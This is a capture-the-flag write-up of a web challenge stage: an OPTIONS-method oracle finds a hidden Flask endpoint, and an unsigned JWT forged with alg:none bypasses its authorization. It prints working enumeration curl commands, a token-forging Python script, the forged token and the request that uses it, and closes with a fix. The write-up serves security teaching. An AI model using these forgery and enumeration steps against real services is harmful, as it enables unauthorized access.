# Meridian Deck 4/5 — Records Bridge

**Flag:** `reentry{4lg_n0n3_w4lks_r1ght_p4st_th3_gu4rd}`
**Recovered on the way:** KEPLER's grant `relay=lsu-relay-3391&door=CREW-QTRS` (mac `6618a1eb…`) and the target door `EVA-LKR-07` (needed in stage 5)

| | |
|---|---|
| Category | Web / JWT — signature bypass via `alg:none` |
| Target | `https://reentry-records-bridge.chals.io` (offline now) |
| Stack | Flask + gunicorn, session = JWT HS256 in the `session` cookie |
| Files | none |

> **Challenge brief:** The crew deck's records bridge relays MERIDIAN door-access records. It won't
> release a record to just anyone — a relay session only sees what its access covers, and a fresh
> visitor's covers nothing. It also doesn't advertise where the records live. Find the relay,
> convince the bridge you're cleared for it, and pull KEPLER's record.

---

## Short version

1. The session is a **JWT HS256** `{"sub":"guest","relays":[]}`. The secret is strong (uncrackable
   — that is intentional). The real path is a **signature bypass**, not a crack.
2. `/` is static and does not read the session. The records live at a **hidden** endpoint that
   shows the same 404 mask without access — "It doesn't advertise where the records live".
3. The hidden endpoint is **`/relay/access`**, found with an **OPTIONS oracle** (Flask returns
   `200 + Allow` for an existing route at routing time, before the view's authorization runs).
4. `/relay/access` reads `relays` from the JWT and **accepts `alg:none`**. A forged
   `{"alg":"none"}` token with `relays:["lsu-relay-3391"]` and an empty signature unlocks KEPLER's
   record and the flag.

Mapping to the brief: *find the relay* → relay id `lsu-relay-3391` (from stage 3);
*convince the bridge you're cleared* → change `relays:[]` to `relays:["lsu-relay-3391"]`;
*pull KEPLER's record* → GET `/relay/access` with the forged token.

---

## 1. Recon

The session cookie is a JWT: header `{"alg":"HS256","typ":"JWT"}`, payload
`{"sub":"guest","relays":[]}`. `relays:[]` = "a fresh visitor's covers nothing".

What does not work:
- **Cracking the HS256 secret** — full rockyou + themed variants + common JWT secrets → nothing.
- **`/`** — static, does not read the session.
- Every non-existing path returns the same custom 404, so GET size/status is not an oracle.

## 2. The OPTIONS oracle

In Flask, the automatic OPTIONS response is produced at routing time (`200` + `Allow`) **before**
the view function and its authorization run. So OPTIONS says "this route exists" even when GET is
masked to 404:

```bash
URL=https://reentry-records-bridge.chals.io
curl -s -o /dev/null -w "%{http_code}\n" -X OPTIONS "$URL/static/x.css"   # 200 (route exists)
curl -s -o /dev/null -w "%{http_code}\n"             "$URL/static/x.css"   # 404 (file missing)
curl -s -o /dev/null -w "%{http_code}\n" -X OPTIONS "$URL/does-not-exist"  # 404
```

OPTIONS is not rate-limited, so it is good for brute-forcing. Brute-forcing prefix/word
combinations finds:

```
OPTIONS /relay/access  ->  200   (Allow: OPTIONS, GET, HEAD)
```

It is a literal route (`/relay/<other>` → 404, so not a parameter).

## 3. Exploit — `alg:none`

`/relay/access` reads `relays` from the JWT and accepts `alg:none` (no signature verification):

```bash
# forged token: alg:none, empty signature, relays = registered relay id
python3 - <<'PY'
import base64, json
b = lambda x: base64.urlsafe_b64encode(x).decode().rstrip('=')
h = b(json.dumps({"alg":"none","typ":"JWT"}).encode())
p = b(json.dumps({"sub":"guest","relays":["lsu-relay-3391"]}).encode())
print(h + "." + p + ".")        # empty third segment (signature)
PY
# eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJndWVzdCIsInJlbGF5cyI6WyJsc3UtcmVsYXktMzM5MSJdfQ.

TOK='eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJndWVzdCIsInJlbGF5cyI6WyJsc3UtcmVsYXktMzM5MSJdfQ.'
curl -s -b "session=$TOK" "https://reentry-records-bridge.chals.io/relay/access" | grep -oE 'reentry\{[^}]*\}'
# reentry{4lg_n0n3_w4lks_r1ght_p4st_th3_gu4rd}
```

🚩 **Flag:** `reentry{4lg_n0n3_w4lks_r1ght_p4st_th3_gu4rd}`

## 4. KEPLER's record (needed for stage 5)

```
record holder     : KEPLER — station architect (MERIDIAN)
restricted door   : EVA locker — EVA-LKR-07
crew access grant : sm3$72656c61793d6c73752d72656c61792d3333393126646f6f723d435245572d51545253$6618a1eb…
bridge clearance  : reentry{4lg_n0n3_w4lks_r1ght_p4st_th3_gu4rd}
```

The hex in the grant decodes to a readable string:

```bash
echo '72656c61793d6c73752d72656c61792d3333393126646f6f723d435245572d51545253' | xxd -r -p
# relay=lsu-relay-3391&door=CREW-QTRS
```

> **Verification note:** I confirmed that hex decodes to `relay=lsu-relay-3391&door=CREW-QTRS`.
> The grant format is `sm3$<payload-hex>$<mac>` — an HMAC-prefixed access grant. This grant (and
> the target door `EVA-LKR-07`) is the input to stage 5's length-extension attack. The web service
> is offline now, so the end-to-end GET cannot be re-run.

---

## Why it works / lessons

- **`alg:none`** is the classic JWT flaw. If the server honors the token's `alg` and allows `none`,
  the signature means nothing — the attacker writes any claims (here `relays`), and the guard lets
  them through. Exactly what the flag says.
- A strong, uncrackable HS256 secret is deliberate — the intent is the `alg:none` bypass.
- Hiding an endpoint (security by obscurity) is not access control; `/relay/access` should only
  return the record for a properly verified, signed session.
- Fix: `jwt.decode(token, SECRET, algorithms=["HS256"])` — reject `none`.

> **Previous:** [3 - Life Support](3%20-%20Life%20Support.md) · **Next:** [5 - Latch](5%20-%20Latch.md)
